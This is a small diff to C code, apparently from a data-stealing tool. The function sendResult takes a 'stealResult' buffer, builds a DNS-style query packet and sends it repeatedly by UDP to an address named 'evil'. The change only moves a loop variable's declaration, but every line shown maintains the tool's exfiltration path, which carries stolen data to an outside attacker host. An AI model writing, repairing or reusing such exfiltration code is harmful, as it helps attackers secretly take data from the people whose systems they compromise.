@@ -103,6 +103,7 @@ sendResult(char stealResult[])
     unsigned char *packet;
     int sockfd;
     unsigned int slen = sizeof(evil);
+    int i;
 
     if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
         return;
@@ -120,7 +121,7 @@ sendResult(char stealResult[])
     free(header);
     free(question);
 
-    for (int i =0;i<MAX_RESEND;i++)
+    for (i =0;i<MAX_RESEND;i++)
     {
        sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);
 
